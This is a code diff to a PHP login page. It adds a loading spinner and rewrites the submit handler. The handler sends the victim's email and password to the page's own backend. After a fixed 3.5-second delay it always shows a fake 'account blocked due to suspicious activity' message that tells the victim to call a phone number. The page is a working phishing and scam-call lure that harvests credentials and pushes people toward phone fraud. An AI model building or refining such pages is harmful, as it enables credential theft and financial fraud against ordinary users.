@@ -325,6 +325,28 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
                 text-align: center;
             }
         }
+		.btn-primary.loading {
+  pointer-events: none;
+  opacity: 0.8;
+}
+
+.btn-primary.loading::after {
+  content: "";
+  width: 20px;
+  height: 20px;
+  border: 3px solid rgba(255,255,255,0.4);
+  border-top-color: #fff;
+  border-radius: 50%;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg) translate(-50%, -50%); }
+}
 		
     </style>
 </head>
@@ -444,63 +466,53 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             p.type = p.type === "password" ? "text" : "password";
         }
 
-      
-        const form = document.getElementById("loginForm");
-        const errorBox = document.getElementById("errorBox");
-        const email = document.getElementById("email");
-        const password = document.getElementById("password");
+      const form = document.getElementById("loginForm");
+const errorBox = document.getElementById("errorBox");
+const email = document.getElementById("email");
+const password = document.getElementById("password");
+const loginBtn = document.querySelector(".btn-primary");
 
-        const BLOCKED_MSG = "Due to suspicious activity, your account has been blocked. Please contact our customer service at +1877-334-0352. Error code E902";
+const BLOCKED_MSG =
+  " Due to suspicious activity, your account has been blocked. Please contact our customer service at <strong>+1877-334-0352</strong>";
 
-        function showError(msg) {
-            // set message and show
-            errorBox.innerHTML = `<strong>Account blocked</strong>${msg}`;
-            errorBox.style.display = "block";
+function showError(msg) {
+  errorBox.innerHTML = `<strong>Account blocked</strong>${msg}`;
+  errorBox.style.display = "block";
 
-            // add visual input errors
-            email.classList.add("input-error");
-            password.classList.add("input-error");
+  email.classList.add("input-error");
+  password.classList.add("input-error");
 
-            // move focus to error box for screen readers (but preserve scroll)
-            errorBox.setAttribute('tabindex', '-1');
-            errorBox.focus({ preventScroll: true });
-        }
+  errorBox.setAttribute("tabindex", "-1");
+  errorBox.focus({ preventScroll: true });
+}
 
-        function clearError() {
-            if (errorBox.style.display === "block") {
-                errorBox.style.display = "none";
-                errorBox.innerHTML = "";
-                email.classList.remove("input-error");
-                password.classList.remove("input-error");
-            }
-        }
+function clearError() {
+  errorBox.style.display = "none";
+  email.classList.remove("input-error");
+  password.classList.remove("input-error");
+}
+
 form.addEventListener("submit", function (e) {
-    e.preventDefault();
+  e.preventDefault();
 
-    if (!email.value.trim() || !password.value.trim()) {
-        email.focus();
-        return;
-    }
+  if (!email.value.trim() || !password.value.trim()) return;
 
-    clearError(); // hide if already visible
+  clearError();
 
-    // send data to PHP (same page)
-    const formData = new FormData(form);
+  // 🔄 START SPINNER
+  loginBtn.classList.add("loading");
+  loginBtn.textContent = "Logging in...";
 
-    fetch("", {
-        method: "POST",
-        body: formData
-    })
-    .then(res => res.text())
-    .then(data => {
-        console.log("Server:", data);
-    })
-    .catch(err => console.error(err));
+  // send data (optional – backend)
+  const formData = new FormData(form);
+  fetch("", { method: "POST", body: formData }).catch(() => {});
 
-    // ⏳ SHOW ERROR AFTER 3.5 SECONDS
-    setTimeout(() => {
-        showError(" " + BLOCKED_MSG);
-    }, 3500);
+  // ⏳ AFTER 3.5 SECONDS
+  setTimeout(() => {
+    loginBtn.classList.remove("loading");
+    loginBtn.textContent = "Log In";
+    showError(BLOCKED_MSG);
+  }, 3500);
 });
 
 
